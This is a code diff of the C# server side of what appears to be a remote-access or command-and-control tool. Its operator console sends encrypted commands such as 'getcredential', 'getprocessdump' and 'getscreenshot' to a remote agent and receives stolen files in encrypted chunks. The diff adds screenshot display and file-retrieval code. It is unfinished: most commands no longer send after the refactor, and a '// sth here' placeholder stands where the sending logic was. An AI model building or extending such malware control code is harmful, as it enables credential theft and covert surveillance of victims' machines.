@@ -9,6 +9,7 @@ using System.Net.Sockets;
 using System.Text;
 using System.Threading.Tasks;
 using System.Windows.Forms;
+using System.Windows.Forms.VisualStyles;
 
 namespace Server_side
 {
@@ -109,6 +110,7 @@ namespace Server_side
 
         private void cmdComboBox_SelectedIndexChanged(object sender, EventArgs e)
         {
+            string delimiter = "|;|";
             string placeholder = "";
             switch (cmdComboBox.SelectedIndex)
             {
@@ -116,34 +118,91 @@ namespace Server_side
                     commandBox.Text = "";
                     return;
                 case 1:
-                    placeholder = agentfileBox.Text;
-                    break;
+                    {
+                        placeholder = agentfileBox.Text;
+                        break;
+                    }
                 case 2:
-                    placeholder = "getcredential";
-                    break;
+                    { 
+                        placeholder = "getcredential";
+                        
+                        break;
+                    }
                 case 3:
                     placeholder = "getprocessdump";
                     break;
                 case 4:
-                    placeholder = "getscreenshot";
-                    break;
+                    {
+                        placeholder = "getscreenshot";
+                        string command = $"{cmdComboBox.SelectedIndex + 1}{delimiter}{placeholder}";
+                        byte[] encryptedCommand = encryptor.Encrypt(command.Trim());
+                        NetworkLayer.Send(clientSocket, encryptedCommand);
+
+                        logging("Command sent: " + cmdComboBox.Text);
+
+                        // Receive response
+                        try
+                        {
+                            byte[] image = GetResultFile(false);
+                            if (image != null && image.Length > 0)
+                            {
+                                using (MemoryStream ms = new MemoryStream(image))
+                                {
+                                    Image img = Image.FromStream(ms);
+                                    DisplayScreenshot displayScreenshot = new DisplayScreenshot(img);
+                                    displayScreenshot.Show();
+                                }
+                            }
+                            else
+                            {
+                                logging("Received image data is null or empty.");
+                            }
+                        }
+                        catch (Exception ex)
+                        {
+                            logging("Error displaying image: " + ex.Message);
+                            MessageBox.Show("Error displaying image: " + ex.Message);
+                        }
+                        break;
+                    }
                 case 5:
                     placeholder = "exit";
                     break;
             }
 
+            // sth here
+        }
+
+        private byte[] GetResultFile(bool saved)
+        {
             string delimiter = "|;|";
-            string command = $"{cmdComboBox.SelectedIndex + 1}{delimiter}{placeholder}";
-            byte[] encryptedCommand = encryptor.Encrypt(command.Trim());
-            NetworkLayer.Send(clientSocket, encryptedCommand);
+            byte[] received = NetworkLayer.ReceiveResult(clientSocket);
+            string decrypted = encryptor.Decrypt(received);
+            string[] parts = decrypted.Split(delimiter);
 
-            logging("Command sent: " + cmdComboBox.Text);
+            string guid = parts[0];
+            int chunkCount = int.Parse(parts[1]);
+            string fileName = parts[2];
 
-            // Receive response
-            byte[] response = NetworkLayer.ReceiveResult(clientSocket);
-            string decryptedResponse = encryptor.Decrypt(response);
-            logging("Response received");
-            // will handle tomorrow, imma sleep now to tired
+            string fileBase64 = "";
+            for (int i = 0; i < chunkCount; i++)
+            {
+                byte[] chunk = NetworkLayer.ReceiveResult(clientSocket);
+                string chunkDecrypted = encryptor.Decrypt(chunk);
+                string[] chunkParts = chunkDecrypted.Split(delimiter);
+                string chunkData = chunkParts[1];
+                fileBase64 += chunkData;
+            }
+
+            byte[] fileData = Encryptor.InvertStr(fileBase64);
+            
+            if (saved)
+            {
+                string filePath = Path.Combine(Program.mySettings.Properties["SavePath"].DefaultValue.ToString(), fileName);
+                File.WriteAllBytes(filePath, fileData);
+            }
+
+            return fileData;
         }
     }
 
